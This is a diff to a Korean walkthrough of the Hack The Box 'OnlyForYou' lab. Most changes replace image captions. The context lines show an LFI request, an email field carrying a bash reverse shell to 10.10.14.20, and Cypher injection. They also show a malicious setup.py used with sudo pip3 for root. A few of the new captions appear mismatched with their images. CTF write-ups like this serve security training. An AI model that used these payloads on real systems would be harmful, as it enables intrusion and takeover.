@@ -102,17 +102,17 @@ $ cat /etc/hosts | grep htb
 
 주요 섹션으로는 `Home`, `About`, `Services`, `Team`, `Contact`가 존재한다.
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/only4you.png)
+![웹페이지 구성](/assets/htb-linux/onlyforyou/only4you.png)
 
 특별한 기능이나 로그인 페이지는 존재하지 않으며, 하단에는 다음과 같은 **이름, 이메일, 제목, 내용 입력 폼**이 포함되어 있다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/email-form.png)
+![정보 입력](/assets/htb-linux/onlyforyou/email-form.png)
 
 ## beta.only4you.htb
 
 해당 도메인은 Only4you의 베타 기능 안내용 페이지로, 단순한 메시지와 함께 두 개의 버튼(`Return back`, `Source Code`)이 제공된다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/beta-only4you.png)
+![소스코드 다운로드 웹사이트](/assets/htb-linux/onlyforyou/beta-only4you.png)
 
 `Source Code` 버튼을 통해 소스코드 다운로드 기능을 제공하며, 상단 메뉴에는 `/resize`, `/convert` 경로로 연결되는 링크가 존재한다.
 
@@ -303,7 +303,7 @@ image=/etc/passwd
 
 따라서 Burp Suite를 이용해 `Content-Type: application/x-www-form-urlencoded` 헤더와 함께 `image=/etc/passwd` 값을 포함한 POST 요청을 전송하면, `/etc/passwd` 파일이 그대로 반환된다.
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/lfi.png)
+![LFI](/assets/htb-linux/onlyforyou/lfi.png)
 
 이후 `/etc/nginx/sites-enabled/default` 파일을 확인한 결과, 다음과 같은 웹 루트 디렉토리 경로들을 확인할 수 있었다:
 
@@ -482,11 +482,11 @@ def issecure(email, ip):
 
 `python3` 환경에서 정규식을 테스트하기 위해 간단한 `issecure()` 함수를 정의하여 이메일 형식을 검증하였다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/python.png)
+![로직 테스트](/assets/htb-linux/onlyforyou/python.png)
 
 `; sleep 3` 과 같은 명령어가 포함된 이메일 주소도 정규표현식을 통과하여 **The email is correct!** 라고 출력된다. 이는 곧 **Command Injection** 의 가능성을 나타낸다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/issecure.png)
+![Command Injection](/assets/htb-linux/onlyforyou/issecure.png)
 
 ---
 
@@ -500,11 +500,11 @@ def issecure(email, ip):
 jisang@only4you.htb; bash -c 'bash -i >& /dev/tcp/10.10.14.20/9001 0>&1'
 ```
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/revshell.png)
+![리버스 셸 삽입](/assets/htb-linux/onlyforyou/revshell.png)
 
 HTML `email` 입력 필드에는 기본적으로 이메일 형식을 제한하는 `type="email"` 속성이 존재하므로, 개발자 도구(F12)를 사용하여 해당 속성을 제거하였다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/type-none.png)
+![EMAIL 속성 제거](/assets/htb-linux/onlyforyou/type-none.png)
 
 이후 나의 터미널에서 `nc` 명령어를 사용하여 포트를 열어 대기하였다:
 
@@ -514,7 +514,7 @@ $ nc -lvnp 9001
 
 그리고 웹 페이지에서 **Send Message** 버튼을 클릭하면, 삽입된 명령어가 실행되어 리버스 셸이 연결되며 `www-data` 셸 획득에 성공하였다.
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/webshell.png)
+![RCE](/assets/htb-linux/onlyforyou/webshell.png)
 
 ---
 
@@ -584,41 +584,41 @@ www-data@only4you:~/only4you.htb$ ./chisel client 10.10.14.20:8000 R:socks
 
 먼저 `3000` 포트에 서비스되고 있는 웹 애플리케이션에 접근하였다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/gogs.png)
+![Gogs](/assets/htb-linux/onlyforyou/gogs.png)
 
 해당 웹사이트는 **Gogs**라는 Git 저장소 관리 도구로, 내부에서 운영되는 Git 서비스인 것으로 보인다.
 
 사용자 목록을 확인한 결과, `administrator` 계정과 `john` 이라는 일반 사용자가 등록되어 있는 것을 확인할 수 있었다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/gogs-user.png)
+![Neo4j 웹 인터페이스](/assets/htb-linux/onlyforyou/gogs-user.png)
 
 `7474` 포트에 접근하자 Neo4j 웹 인터페이스가 나타났다. 이는 웹 기반의 `Neo4j Browser`로, 그래프 데이터베이스와 상호작용할 수 있는 콘솔을 제공한다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/neo4j.png)
+![로그인 페이지](/assets/htb-linux/onlyforyou/neo4j.png)
 
 `8001` 포트에서는 내부용 로그인 페이지가 나타났다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/only4you-localhost.png)
+![admin 로그인 성공](/assets/htb-linux/onlyforyou/only4you-localhost.png)
 
 로그인 페이지에서 `admin/admin` 을 사용한 결과, 로그인에 성공하였고 `/dashboard` 경로로 리다이렉트되었다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/only4you-dashboard.png)
+![dashboard 경로](/assets/htb-linux/onlyforyou/only4you-dashboard.png)
 
 `/dashboard` 내 Tasks 섹션에서 **Migrated to a new database (neo4j)** 항목을 통해, 현재 시스템이 `Neo4j` 데이터베이스를 사용하고 있음을 확인할 수 있다.
 
 > **[Neo4j](https://neo4j.com/product/cypher-graph-query-language/)는 Cypher 쿼리 언어를 사용하는 그래프 기반 데이터베이스이다.**
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/only4you-tasks.png)
+![Neo4j 데이터베이스](/assets/htb-linux/onlyforyou/only4you-tasks.png)
 
 `/employees` 페이지에서는 직원 정보를 조회할 수 있는 검색창과 테이블 인터페이스가 제공된다.
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/only4you-employees.png)
+![직원 정보 조회 검색창](/assets/htb-linux/onlyforyou/only4you-employees.png)
 
 ### Cypher Injection
 
 검색창에 `a` 를 입력하면, 이름에 해당 문자가 포함된 직원들의 정보가 출력된다.
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/only4you-search.png)
+![직원 출력](/assets/htb-linux/onlyforyou/only4you-search.png)
 
 이후 `' or '1'='1` 과 같은 일반적인 인젝션 문자열을 입력하더라도 동일한 결과가 출력되는 것으로 보아, 사용자 입력이 적절하게 필터링되지 않고 내부 **Cypher 쿼리에 직접 반영되고 있음**을 알 수 있다.
 
@@ -683,11 +683,11 @@ $ python3 -m http.server 9999
 
 [CrackStation](https://crackstation.net/) 웹 사이트를 통해 `admin`, `john` 계정의 해시를 복호화하는 데 성공하였다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/hashcrack.png)
+![해시 크랙](/assets/htb-linux/onlyforyou/hashcrack.png)
 
 이후 복호화한 비밀번호를 이용하여 `ssh`를 통해 `john` 계정으로 접속을 시도한 결과, 정상적으로 셸에 접근하는 데 성공하였다.
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/john-shell.png)
+![셸 접속 성공](/assets/htb-linux/onlyforyou/john-shell.png)
 
 ## john → root Lateral Movement
 
@@ -717,11 +717,11 @@ User john may run the following commands on only4you:
 
 `john` 계정으로 Gogs 서버에 로그인한 뒤, `Test`라는 이름의 레포지토리가 존재하는 것을 확인하였다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/john-test.png)
+![레포지토리 확인](/assets/htb-linux/onlyforyou/john-test.png)
 
 해당 레포지토리는 비공개(`Private`) 상태였으나, 설정 페이지에서 `Visibility` 항목의 체크박스를 해제하여 공개 레포지토리로 변경하였다: 
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/visibility.png) 
+![공개 레포지토리로 변경](/assets/htb-linux/onlyforyou/visibility.png) 
 
 > Gogs에 업로드할 악성 `.tar.gz` 패키지를 만들기 위해 [this_is_fine_wuzzi](https://github.com/wunderwuzzi23/this_is_fine_wuzzi/) 도구를 이용하였다.
 
@@ -733,7 +733,7 @@ $ git clone https://github.com/wunderwuzzi23/this_is_fine_wuzzi/
 
 그 후, `setup.py` 파일을 열어 `import os`를 추가하고, `RunEggInfoCommand` 클래스에 리버스 셸 명령어를 삽입하였다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/setup-reverse.png)
+![리버스 셸 삽입](/assets/htb-linux/onlyforyou/setup-reverse.png)
 
 이후 `python -m build` 명령어를 이용해 Python 패키지를 빌드하였다:
 
@@ -743,11 +743,11 @@ $ python -m build
 
 빌드 완료 후 `dist` 디렉토리에 `.whl` 파일과 `.tar.gz` 파일이 생성된 것을 확인할 수 있다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/build.png)
+![.tar.gz 파일 생성](/assets/htb-linux/onlyforyou/build.png)
 
 이제 `john` 사용자의 레포지토리로 돌아가 악성 `.tar.gz` 파일 `this_is_fine_wuzzi-0.0.1.tar.gz` 업로드를 진행하였다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/upload.png)
+![업로드 진행](/assets/htb-linux/onlyforyou/upload.png)
 
 업로드를 완료한 뒤, 로컬 터미널에서 리버스 셸을 수신 대기하기 위해 `nc` 명령어를 실행하였다:
 
@@ -763,9 +763,9 @@ john@only4you:~$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw
 
 그 결과, `root` 권한의 리버스 셸 획득에 성공하였다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/root.png)
+![리버스 셸 획득](/assets/htb-linux/onlyforyou/root.png)
 
 최종적으로 `/root/root.txt` 파일을 읽어 플래그를 획득하였다:
 
-![OnlyForYou](/assets/htb-linux/onlyforyou/flag.png)
+![루트 플래그 획득](/assets/htb-linux/onlyforyou/flag.png)
 
